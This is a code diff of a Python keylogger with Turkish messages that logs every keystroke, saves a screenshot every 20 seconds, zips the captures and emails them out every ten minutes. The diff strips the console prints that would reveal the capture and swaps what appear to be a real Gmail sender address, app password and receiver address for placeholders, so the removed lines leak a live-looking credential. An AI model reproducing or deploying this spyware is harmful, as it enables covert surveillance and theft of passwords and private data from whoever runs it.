@@ -9,20 +9,17 @@ from email import encoders
 import zipfile
 import os
 
-log = open("Logs\\log.txt", "w")
+log = open("..\\..\\..\\Logs\\log.txt", "w")
 
 image_counter = 1
 zip_counter = 1
 
 def callback_function(key):
     try:
-        print('Alfanumerik anahtar {0} tuşlandı'.format(key.char))
         log.write(key.char)
         log.flush()
         
     except AttributeError:
-        print('Özel anahtar {0} tuşlandı'.format(key))
-       
         if key == key.space:
             tus = " "
         elif key == key.enter:
@@ -60,12 +57,12 @@ def callback_function(key):
 
 def send_email(message):
         
-    sender_email = "stockcontroltest@gmail.com"
-    sender_password = "xwitsvtlsobeamoe"
+    sender_email = "yourmail@example.com"
+    sender_password = "yourpassword"
 
-    receiver_email = "eferoglu1967@gmail.com"
+    receiver_email = "yourmail@example.com"
 
-    subject = "Rar Dosyası"
+    subject = "..\\..\\..\\Rar Dosyası"
 
     rar_file = message
 
@@ -90,26 +87,25 @@ def send_email(message):
         text = msg.as_string()
         server.sendmail(sender_email, receiver_email, text)
         server.quit()
-        print("E-posta gönderildi!")
     except Exception as e:
         print("E-posta gönderme hatası:", str(e))
 
 def thread_function():
     global zip_counter
-    folders=["Images","Logs"]
-    zip_name=f"Rar Files\\Log{zip_counter}.zip"
+    folders=["..\\..\\..\\Images","..\\..\\..\\Logs"]
+    zip_name=f"..\\..\\..\\Rar Files\\Log{zip_counter}.zip"
     zip_counter +=1
     convert_zip(folders,zip_name)
     send_email(zip_name)
-    timer_object = threading.Timer(15,thread_function)
+    timer_object = threading.Timer(600,thread_function)
     timer_object.start()
 
 def take_screenshot():
     global image_counter
     ekran=pyautogui.screenshot()
-    ekran.save(f"Images\\ekran{image_counter}.jpg")
+    ekran.save(f"..\\..\\..\\Images\\ekran{image_counter}.jpg")
     image_counter += 1
-    timer_object = threading.Timer(5,take_screenshot)
+    timer_object = threading.Timer(20,take_screenshot)
     timer_object.start()
 
     
@@ -122,13 +118,11 @@ def convert_zip(kaynak_dosyalar, hedef_zip):
                     zip_path = os.path.relpath(file_path, kaynak_dosya)
                     zipdosyasi.write(file_path, zip_path)
 
-
 keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
 with keylogger_listener:
     take_screenshot()
     thread_function()
     keylogger_listener.join()
-
 
 log.close()
     
